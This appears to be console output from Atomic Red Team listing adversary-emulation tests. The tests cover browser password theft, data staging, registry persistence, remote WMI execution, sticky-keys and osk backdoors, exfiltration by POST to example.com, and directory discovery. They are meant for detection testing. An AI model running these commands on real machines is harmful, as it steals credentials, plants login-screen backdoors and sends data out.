if (Test-Path "#{webbrowserpassview_path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1555.003\bin\WebBrowserPassView.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile "#{webbrowserpassview_path}"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\T1555.003\bin\" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile "C:\AtomicRedTeam\atomics\T1555.003\bin\WebBrowserPa
ssView.exe"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Credentials from Password Stores: Credentials from Web Browsers T1555.003
Atomic Test Name: BrowserStealer (Chrome / Firefox / Microsoft Edge)
Atomic Test Number: 16
Atomic Test GUID: 6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd
Description: [Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attac
k simulates stealing the data from the browser files and printing them to the command line. If using to test with Firefox, if the browser is x64 you need to use the x64 build

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Copy-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads" > $null
Remove-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\Login Data" -Destination "$env:localappdata\Google\Chrome\User Data\Default\" > $null
cd "$env:PathToAtomicsFolder\T1555.003\bin"
.\BrowserCollector.exe
Command (with inputs):
Copy-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -Destination "C:\AtomicRedTeam\atomics\..\ExternalPayloads" > $null
Remove-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
Copy-Item "$env:C:\AtomicRedTeam\atomics\T1555.003\src\Login Data" -Destination "$env:localappdata\Google\Chrome\User Data\Default\" > $null
cd "$env:C:\AtomicRedTeam\atomics\T1555.003\bin"
.\BrowserCollector.exe

Cleanup Commands:
Command:
Remove-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads" -Destination "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\Login Data" > $null
Command (with inputs):
Remove-Item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
Copy-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads" -Destination "$env:localappdata\Google\Chrome\User Data\Default\Login Data" > $null
Remove-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Login Data" > $null

Dependencies:
Description: Google Chrome must be on the device.
Check Prereq Command:
if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
$installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
msiexec /i $installer /qn
Start-Process -FilePath "chrome.exe"
Stop-Process -Name "chrome"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
$installer = "C:\AtomicRedTeam\atomics\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
Invoke-WebRequest -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
msiexec /i $installer /qn
Start-Process -FilePath "chrome.exe"
Stop-Process -Name "chrome"
Description: BrowserCollector must exist in the bin directory
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1555.003\bin\BrowserCollector.exe") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe" -Outfile: "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.e
xe"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\T1555.003\bin\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe" -Outfile: "C:\AtomicRedTeam\atomics\T1555.003\bin\BrowserCollec
tor.exe"
Description: Login Data file that is a copy of a chrome Login Data that contains credentials for the tool to "steal." Must exist at the specified path.
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\T1555.003\src\Login Data") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\T1555.003\src\Login Data") {exit 0} else {exit 1}
Get Prereq Command:
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T155.003/src/LoginData?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\Login Data"
Get Prereq Command (with inputs):
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T155.003/src/LoginData?raw=true" -Outfile: "C:\AtomicRedTeam\atomics\T1555.003\src\Login Data"
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Data from Local System T1005
Atomic Test Name: Search files of interest and save them to a single zip file (Windows)
Atomic Test Number: 1
Atomic Test GUID: d3d9af44-b8ad-4375-8b0a-4bff4b7e419c
Description: This test searches for files of certain extensions and saves them to a single zip file prior to extraction.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$startingDirectory = "#{starting_directory}"
$outputZip = "#{output_zip_folder_path}"
$fileExtensionsString = "#{file_extensions}" 
$fileExtensions = $fileExtensionsString -split ", "

New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null

Function Search-Files {
  param (
    [string]$directory
  )
  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
    $fileExtensions -contains $_.Extension.ToLower()
  }
  return $files
}

$foundFiles = Search-Files -directory $startingDirectory
if ($foundFiles.Count -gt 0) {
  $foundFilePaths = $foundFiles.FullName
  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"

  Write-Host "Zip file created: $outputZip\data.zip"
  } else {
      Write-Host "No files found with the specified extensions."
  }
Command (with inputs):
$startingDirectory = "C:\Users"
$outputZip = "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1005"
$fileExtensionsString = ".doc, .docx, .txt" 
$fileExtensions = $fileExtensionsString -split ", "

New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null

Function Search-Files {
  param (
    [string]$directory
  )
  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
    $fileExtensions -contains $_.Extension.ToLower()
  }
  return $files
}

$foundFiles = Search-Files -directory $startingDirectory
if ($foundFiles.Count -gt 0) {
  $foundFilePaths = $foundFiles.FullName
  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"

  Write-Host "Zip file created: $outputZip\data.zip"
  } else {
      Write-Host "No files found with the specified extensions."
  }

Cleanup Commands:
Command:
Remove-Item -Path  $outputZip\data.zip -Force
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1074\T1074.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Data Staged: Local Data Staging T1074.001
Atomic Test Name: Stage data from Discovery.bat
Atomic Test Number: 1
Atomic Test GUID: 107706a5-6f9f-451a-adae-bab8c667829f
Description: Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution, verify 
that the file is saved in the temp directory.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile #{output_file}
Command (with inputs):
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile $env:TEMP\discovery.bat

Cleanup Commands:
Command:
Remove-Item -Force #{output_file} -ErrorAction Ignore
Command (with inputs):
Remove-Item -Force $env:TEMP\discovery.bat -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Data Staged: Local Data Staging T1074.001
Atomic Test Name: Zip a Folder with PowerShell for Staging in Temp
Atomic Test Number: 3
Atomic Test GUID: a57fbe4b-3440-452a-88a7-943531ac872a
Description: Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder
_to_zip.zip was placed in the temp directory.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
Command (with inputs):
Compress-Archive -Path "C:\AtomicRedTeam\atomics\T1074.001\bin\Folder_to_zip" -DestinationPath $env:TEMP\Folder_to_zip.zip -Force

Cleanup Commands:
Command:
Remove-Item -Path #{output_file} -ErrorAction Ignore
Command (with inputs):
Remove-Item -Path $env:TEMP\Folder_to_zip.zip -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Event Triggered Execution T1546
Atomic Test Name: Persistence with Custom AutodialDLL
Atomic Test Number: 1
Atomic Test GUID: aca9ae16-7425-4b6d-8c30-cad306fdbd5b
Description: The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this 
key to a DLL of their choice. 
The sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing. [Blog](htt
ps://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
Command (with inputs):
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value C:\AtomicRedTeam\atomics\T1546\bin\AltWinSock2DLL.dll

Cleanup Commands:
Command:
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll

Dependencies:
Description: AltWinSock2DLL DLL must exist on disk at specified at C:\AtomicRedTeam\atomics\T1546\bin\AltWinSock2DLL.dll
Check Prereq Command:
if (Test-Path PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll) { exit 0} else { exit 1}
Check Prereq Command (with inputs):
if (Test-Path C:\AtomicRedTeam\atomics\T1546\bin\AltWinSock2DLL.dll) { exit 0} else { exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\T1546\bin\" -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll" -OutFile "PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll"
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\T1546\bin\" -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll" -OutFile "C:\AtomicRedTeam\atomics\T1546\bin\AltWinSock2DLL.dll"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Event Triggered Execution T1546
Atomic Test Name: HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)
Atomic Test Number: 2
Atomic Test GUID: a574dafe-a903-4cce-9701-14040f4f3532
Description: An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed. [
reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "#{command}" -PropertyType "String"
Command (with inputs):
New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "notepad.exe" -PropertyType "String"

Cleanup Commands:
Command:
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Event Triggered Execution T1546
Atomic Test Name: HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)
Atomic Test Number: 3
Atomic Test GUID: 36b8dbf9-59b1-4e9b-a3bb-36e80563ef01
Description: An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed. [
reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$path = "HKCU:\Software\Microsoft\Command Processor"
if (!(Test-Path -path $path)){
  New-Item -ItemType Key -Path $path
}
New-ItemProperty -Path $path -Name "AutoRun" -Value "#{command}" -PropertyType "String"
Command (with inputs):
$path = "HKCU:\Software\Microsoft\Command Processor"
if (!(Test-Path -path $path)){
  New-Item -ItemType Key -Path $path
}
New-ItemProperty -Path $path -Name "AutoRun" -Value "notepad.exe" -PropertyType "String"

Cleanup Commands:
Command:
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Event Triggered Execution T1546
Atomic Test Name: WMI Invoke-CimMethod Start Process
Atomic Test Number: 4
Atomic Test GUID: adae83d3-0df6-45e7-b2c3-575f91584577
Description: The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod. This is a novel way to perform lateral movement or to 
start a remote process. This does require WinRM to be enabled. The account performing the run will also need to be elevated. A successful execution will stdout that the process start
ed. On the remote endpoint, wmiprvse.exe will spawn the given process.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
# Set the remote computer name and credentials
 $RemoteComputer = "#{dest}"
 $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "#{process}"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
     Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
     Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession
Command (with inputs):
# Set the remote computer name and credentials
 $RemoteComputer = "localhost"
 $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "calc.exe"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
     Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
     Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Event Triggered Execution: Accessibility Features T1546.008
Atomic Test Name: Attaches Command Prompt as a Debugger to a List of Target Processes
Atomic Test Number: 1
Atomic Test GUID: 3309f53e-b22b-4eb6-8fd2-a6cf58b355a9
Description: Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables. Upon successful execution, powershell will 
modify the registry and swap osk.exe with cmd.exe.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$input_table = "#{parent_list}".split(",")
$Name = "Debugger"
$Value = "#{attached_process}"
Foreach ($item in $input_table){
  $item = $item.trim()
  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}
Command (with inputs):
$input_table = "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe".split(",")
$Name = "Debugger"
$Value = "C:\windows\system32\cmd.exe"
Foreach ($item in $input_table){
  $item = $item.trim()
  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}

Cleanup Commands:
Command:
$input_table = "#{parent_list}".split(",")
Foreach ($item in $input_table)
{
  $item = $item.trim()
  reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
}
Command (with inputs):
$input_table = "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe".split(",")
Foreach ($item in $input_table)
{
  $item = $item.trim()
  reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
}
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Event Triggered Execution: Accessibility Features T1546.008
Atomic Test Name: Replace binary of sticky keys
Atomic Test Number: 2
Atomic Test GUID: 934e90cf-29ca-48b3-863c-411737ad44e3
Description: Replace sticky keys binary (sethc.exe) with cmd.exe

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\sethc.exe /A
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

Cleanup Commands:
Command:
copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Event Triggered Execution: Accessibility Features T1546.008
Atomic Test Name: Create Symbolic Link From osk.exe to cmd.exe
Atomic Test Number: 3
Atomic Test GUID: 51ef369c-5e87-4f33-88cd-6d61be63edf2
Description: Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd )
takeown /F %windir%\System32\osk.exe /A
icacls %windir%\System32\osk.exe /grant Administrators:F /t
del %windir%\System32\osk.exe
mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe

Cleanup Commands:
Command:
takeown /F %windir%\System32\osk.exe /A
icacls %windir%\System32\osk.exe /grant Administrators:F /t
del %windir%\System32\osk.exe
copy /Y %windir%\System32\osk.exe.bak %windir%\System32\osk.exe
icacls %windir%\system32\osk.exe /inheritance:d
icacls %windir%\system32\osk.exe /setowner "NT SERVICE\TrustedInstaller"
icacls %windir%\System32\osk.exe /grant "NT SERVICE\TrustedInstaller":F /t
icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX
icacls %windir%\system32\osk.exe /grant:r Administrators:RX
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Exfiltration Over C2 Channel T1041
Atomic Test Name: C2 Data Exfiltration
Atomic Test Number: 1
Atomic Test GUID: d1253f6e-c29b-49dc-b466-2147a6191932
Description: Exfiltrates a file present on the victim machine to the C2 server.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
if(-not (Test-Path #{filepath})){ 
  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
}
[System.Net.ServicePointManager]::Expect100Continue = $false
$filecontent = Get-Content -Path #{filepath}
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
Command (with inputs):
if(-not (Test-Path $env:TEMP\LineNumbers.txt)){ 
  1..100 | ForEach-Object { Add-Content -Path $env:TEMP\LineNumbers.txt -Value "This is line $_." }
}
[System.Net.ServicePointManager]::Expect100Continue = $false
$filecontent = Get-Content -Path $env:TEMP\LineNumbers.txt
Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1203\T1203.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: File and Directory Discovery T1083
Atomic Test Name: File and Directory Discovery (cmd.exe)
Atomic Test Number: 1
Atomic Test GUID: 0e36303b-6762-4500-b003-127743b80ba6
Description: Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
dir /s c:\ >> #{output_file}
dir /s "c:\Documents and Settings" >> #{output_file}
dir /s "c:\Program Files\" >> #{output_file}
dir "%systemdrive%\Users\*.*" >> #{output_file}
dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> #{output_file}
dir "%userprofile%\Desktop\*.*" >> #{output_file}
tree /F >> #{output_file}
Command (with inputs):
dir /s c:\ >> %temp%\T1083Test1.txt
dir /s "c:\Documents and Settings" >> %temp%\T1083Test1.txt
dir /s "c:\Program Files\" >> %temp%\T1083Test1.txt
dir "%systemdrive%\Users\*.*" >> %temp%\T1083Test1.txt
dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\T1083Test1.txt
dir "%userprofile%\Desktop\*.*" >> %temp%\T1083Test1.txt
tree /F >> %temp%\T1083Test1.txt

Cleanup Commands:
Command:
del #{output_file}
Command (with inputs):
del %temp%\T1083Test1.txt
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: File and Directory Discovery T1083
Atomic Test Name: File and Directory Discovery (PowerShell)
Atomic Test Number: 2
Atomic Test GUID: 2158908e-b7ef-4c21-8a83-3ce4dd05a924
Description: Find or discover files on the file system. Upon execution, file and folder information will be displayed.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
ls -recurse
get-childitem -recurse
gci -recurse
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: File and Directory Discovery T1083
Atomic Test Name: Simulating MAZE Directory Enumeration
Atomic Test Number: 5
Atomic Test GUID: c6c34f61-1c3e-40fb-8a58-d017d88286d8
Description: This test emulates MAZE ransomware's ability to enumerate directories using Powershell.  Upon successful execution, this test will output the directory enumeration resul
ts to a specified file, as well as display them in the active window.  See https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$folderarray = @("Desktop", "Downloads", "Documents", "AppData/Local", "AppData/Roaming")
Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}
Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}
Get-ChildItem -Path "${env:ProgramFiles(x86)}" -erroraction silentlycontinue | Out-File -append #{File_to_output}
$UsersFolder = "$env:homedrive\Users\"
foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) 
{
foreach ($secondarydirectory in $folderarray)
 {Get-ChildItem -Path "$UsersFolder/$directory/$secondarydirectory" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}
}
cat #{File_to_output}
Command (with inputs):
$folderarray = @("Desktop", "Downloads", "Documents", "AppData/Local", "AppData/Roaming")
Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\T1083Test5.txt
Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\T1083Test5.txt
Get-ChildItem -Path "${env:ProgramFiles(x86)}" -erroraction silentlycontinue | Out-File -append $env:temp\T1083Test5.txt
$UsersFolder = "$env:homedrive\Users\"
foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) 
{
foreach ($secondarydirectory in $folderarray)
 {Get-ChildItem -Path "$UsersFolder/$directory/$secondarydirectory" -ErrorAction SilentlyContinue | Out-File -append $env:temp\T1083Test5.txt}
}
cat $env:temp\T1083Test5.txt

Cleanup Commands:
Command:
remove-item #{File_to_output} -ErrorAction SilentlyContinue
Command (with inputs):
remove-item $env:temp\T1083Test5.txt -ErrorAction SilentlyContinue
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: File and Directory Discovery T1083
Atomic Test Name: Launch DirLister Executable
Atomic Test Number: 6
Atomic Test GUID: c5bec457-43c9-4a18-9a24-fe151d8971b7
Description: Launches the DirLister executable for a short period of time and then exits.
Recently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible d
irectories and files.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Start-Process "#{dirlister_path}"
Start-Sleep -Second 4
Stop-Process -Name "DirLister"
Command (with inputs):
Start-Process "C:\AtomicRedTeam\atomics\..\ExternalPayloads\DirLister.exe"
Start-Sleep -Second 4
Stop-Process -Name "DirLister"

Dependencies:
Description: DirLister.exe must exist in the specified path C:\AtomicRedTeam\atomics\..\ExternalPayloads\DirLister.exe
Check Prereq Command:
if (Test-Path "#{dirlister_path}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\DirLister.exe") {exit 0} else {exit 1}
Get Prereq Command:
$parentpath = Split-Path "#{dirlister_path}"
New-Item -ItemType Directory -Force -Path $parentpath | Out-Null
Invoke-WebRequest https://github.com/SanderSade/DirLister/releases/download/v2.beta4/DirLister.v2.beta4.zip -OutFile "PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip"

Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4" -Force
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4\*" "$parentpath" -Recurse
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip","PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4" -Recurse -ErrorAction Ignore
Get Prereq Command (with inputs):
$parentpath = Split-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\DirLister.exe"
New-Item -ItemType Directory -Force -Path $parentpath | Out-Null
Invoke-WebRequest https://github.com/SanderSade/DirLister/releases/download/v2.beta4/DirLister.v2.beta4.zip -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\TDirLister.v2.beta4
.zip"
Expand-Archive -Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\TDirLister.v2.beta4.zip" -DestinationPath "C:\AtomicRedTeam\atomics\..\ExternalPayloads\TDirLister.v2.beta4" -Force

Copy-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\TDirLister.v2.beta4\*" "$parentpath" -Recurse
Remove-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\TDirLister.v2.beta4.zip","C:\AtomicRedTeam\atomics\..\ExternalPayloads\TDirLister.v2.beta4" -Recurse -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
